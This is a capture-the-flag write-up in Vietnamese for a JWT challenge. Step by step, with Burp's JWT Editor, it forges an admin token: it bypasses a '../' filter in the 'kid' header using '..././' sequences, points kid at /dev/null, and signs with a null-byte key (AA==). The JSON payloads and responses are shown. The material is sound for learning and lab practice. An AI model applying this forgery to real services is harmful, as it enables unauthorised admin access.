# JWT - Unsecure File Signature

## Solution

Đây là một solution sử dụng JWT extension của burp.

- Giai đoạn Reco

    - Bắt đầu bằng cách gửi lệnh `GET /admin` tới tab Repeater.

    - Lưu ý việc sử dụng JWT như một phiên cookie. Thông qua JWT Extension của burp, hãy lưu ý việc sử dụng kid trong header. Lưu ý thêm rằng payload của JWT là:
    ```
    {
    "user": "guest",
    "iat": 1679390877
    }
    ```

    - Đổi "guest" thành "admin" trong header và giữ nguyên như vậy. Lưu ý rằng vẫn không có quyền truy cập vì kiểm tra chữ ký

- Thay đổi Key file: Path Traversal

Thử thực hiện Path Traversal ở `kid`:

```
{
"alg": "HS256",
"kid": "../dd",
"typ": "JWT"
}
```

Trong response có:

```
{"Unauthorized":"File keys/dd not found"}
```

Điều này cho thấy "../" đã được lọc. Có thể nó chỉ được thay thế bằng "". Vì vậy, hãy thử một payload khác:

```
{
"alg": "HS256",
"kid": "..././dd",
"typ": "JWT"
}
```

Lưu ý rằng response lần này là:

```
{"Unauthorized":"File keys/../dd not found"}
```

Sau đó chỉ cần trỏ tới file dev/null, file null trên Linux.

```
{
"alg": "HS256",
"kid": "..././..././..././..././..././dev/null",
"typ": "JWT"
}
```

Lần này response là

```
{"Unauthorized":"Invalid token signature"}
```

- Sửa đổi signature

Bây giờ cần sửa đổi signature để nó nhất quán với key file. May mắn thay, biết nội dung của dev/null: null.

Để làm được điều đó, bắt đầu bằng cách tạo một khóa. Trong burp trong tab JWT Editor Keys, tạo một New Symmetric Key. Nhấp vào Generate.

Sau đó, mẹo là thay đổi k của khóa thành AA==, đây là Null Byte được mã hóa base64.

Quay lại tab repeater, nhấp vào Sign và chọn khóa đã tạo trước đó.

Gửi request để lấy flag.